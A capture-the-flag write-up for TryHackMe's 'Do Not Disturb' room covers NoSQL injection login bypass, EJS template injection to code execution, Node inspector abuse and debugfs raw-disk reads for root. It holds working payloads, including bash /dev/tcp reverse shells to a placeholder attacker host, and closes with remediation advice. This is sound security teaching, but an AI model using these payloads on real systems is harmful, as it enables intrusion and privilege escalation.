# Do Not Disturb — TryHackMe Writeup

> **Room:** [Do Not Disturb](https://tryhackme.com/room/donotdisturb) · **Difficulty:** Medium
> **Category:** Web / Boot2Root · **Author of writeup:** 0xnyx
> **Goal:** Follow the attacker's footprints from the web app to root on the host.

> ⚠️ In line with TryHackMe's write-up policy, **no flags or passwords are included** — only the methodology.

---

## 1. Reconnaissance

```bash
nmap -sVC -T4 -Pn <TARGET>
```

- **22/tcp** — OpenSSH
- **80/tcp** — **Node.js (Express)** — "Byte Lotus — Poolside"

`PHPSESSID`-style handling aside, the stack being Express hints at JS-specific bugs (NoSQLi, SSTI).

## 2. Authentication bypass — NoSQL injection

The login form POSTs `username` + `password` to `/login`. Express parses bracketed
parameters into objects, so a MongoDB operator can be injected into the query:

```bash
# password[$ne]=x  ->  { password: { $ne: "x" } }  -> matches any password
curl -s -i -X POST http://<TARGET>/login \
  --data-urlencode "username=<STAFF_USER>" \
  --data-urlencode 'password[$ne]=x'
```

A **302 → /staff** with a session cookie confirms the bypass. The valid staff username is
discoverable from the login form's placeholder / by testing which username gets a
`/staff`-level session.

## 3. RCE — EJS Server-Side Template Injection

The staff console (`/staff`) has a "confirmation template" field that renders **EJS**
(`<%= guest %>`). EJS templates can reach Node internals:

```
<%= process.mainModule.require("child_process").execSync("id") %>
```

This executes as the `poolside` service account. A reverse shell follows the same way:

```
<%= process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1"') %>
```

The **user flag** is in `poolside`'s home directory.

## 4. Lateral movement — Node `--inspect` debugger abuse

Enumerating processes reveals a second service running as another user with the Node
**inspector** open on localhost:

```bash
ps aux | grep node        # /usr/bin/node --inspect=127.0.0.1:9229 processor.js
ss -ltnp | grep 9229
```

An open `--inspect` port is a full RCE primitive — connect with the Chrome DevTools
Protocol and evaluate code **in that process's context** (i.e. as that user). Grab the
debugger's WebSocket URL, then use `Runtime.evaluate`:

```bash
curl -s http://127.0.0.1:9229/json      # -> webSocketDebuggerUrl
```

```js
// run via the target's own node (built-in WebSocket on Node 22)
const j = await (await fetch('http://127.0.0.1:9229/json')).json();
const ws = new WebSocket(j[0].webSocketDebuggerUrl);
ws.onopen = () => ws.send(JSON.stringify({id:1, method:'Runtime.evaluate', params:{
  expression: "process.mainModule.require('child_process')"
    + ".exec('bash -c \"bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1\"')"
}}));
```

> Note: `require` is undefined in that eval context — use `process.mainModule.require`.

This yields a shell as the pipeline service account.

## 5. Privilege escalation → root

The pipeline account has **raw disk access** (e.g. membership of the `disk` group /
access to `debugfs`). Raw disk read lets you read any file regardless of permissions —
including `/root`:

```bash
# GTFOBins: debugfs
debugfs -R 'cat /root/root.txt' /dev/sdXN
```

The **root flag** is read directly from the raw device — no SUID or sudo needed. The flag
value itself even hints the lesson: *raw disk access was too much.*

---

## Lessons

- Express + bracketed params = test for **NoSQL operator injection** (`[$ne]`, `[$gt]`, `[$regex]`).
- Any template field (EJS/Handlebars/Jinja) is a candidate for **SSTI → RCE**.
- Always run `ps`, `ss -ltnp`, and `hostname` after a shell — a hex hostname = Docker; a localhost `--inspect` port = free pivot.
- The **`disk` group / `debugfs`** is a root-equivalent primitive (read any file via the raw block device).

## Remediation

- Use parameterized queries and reject non-string auth parameters.
- Never render user input as a template; sandbox or avoid server-side templating of untrusted data.
- Never expose `--inspect` on a production service.
- Don't add service accounts to the `disk` group.

---

*Write-up for [TryHackMe — Do Not Disturb](https://tryhackme.com/room/donotdisturb).*
